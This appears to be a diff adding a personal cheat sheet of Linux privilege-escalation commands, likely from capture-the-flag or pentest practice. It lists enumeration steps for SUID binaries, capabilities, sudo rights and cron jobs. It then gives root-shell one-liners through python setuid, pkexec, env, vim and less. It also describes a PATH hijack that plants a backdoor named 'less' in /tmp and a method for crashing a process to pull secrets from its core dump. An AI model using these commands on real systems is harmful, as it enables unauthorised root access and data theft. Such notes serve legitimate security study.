@@ -1,0 +1,53 @@
+Privilages Excalation Commands:
+ls -lah
+netstat -ant
+netstat -tulpn | grep LISTEN         // to find all listening or running services with their port 
+ps aux
+ls -alh
+getcap -r / 2>/dev/null
+=> to get root in python => python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+crontab -l
+cat /etc/crontab
+find / -perm -4000 2>/dev/null
+find / -user root -perm /4000 2>/dev/null
+       export PATH=/tmp:$PATH
+       #Put your backdoor in /tmp and name it "less"
+       sudo less
+sudo -l -l     # List allowed sudo commands
+wsl -u root visudo    # Fix broken WSL sudo file
+find / -writable # finding writable directories
+suid:
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+sudo pkexec /bin/sh
+
+if we have issue like , only run from terminal then: then always try : /bin/sh -i => outside of interactive shell
+
+################################# running command with less , 
+                            suppose we can run less as a root , so what we can do , 
+                            $ less any_file_to_Read
+                            then to give command in less , do => 
+                            !whoami
+                            and it will get execute and print the result
+
+
+for privilege escalation : sudo env /bin/sh
+
+with VIM:
+   suppose we can edit any file with vim as a root : then first open the file in vim then do ":!/bin/bash" => this is will give us a root shell
+   
+Breaking a running program : suppose we have a shell , and we run a program and in mid we do ctrl + z , then the program will get background, its process was still there, 
+we can confirm by ps command , the application or program name will be there
+ctrl + z => background the current process , never kill it
+now after the application get background, and we need to see what it has done till now means till we close background it, for that we need to kill the process
+ps => list the processes => find application PID => kill -BUS PID => then => fg => to confirm that application crashes and dumbed => crashes are stored in /var/crash/ => 
+to extract the crash dump =>
+apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash-report
+then 
+cd /tmp/crash-report
+to see all the things happened yet => strings CoreDump
+
+
+###################################### Linux knowledge ################################################
+  /proc/  => contains all the processes 
+  /proc/PID/cmdline => process which is executing some commands
+
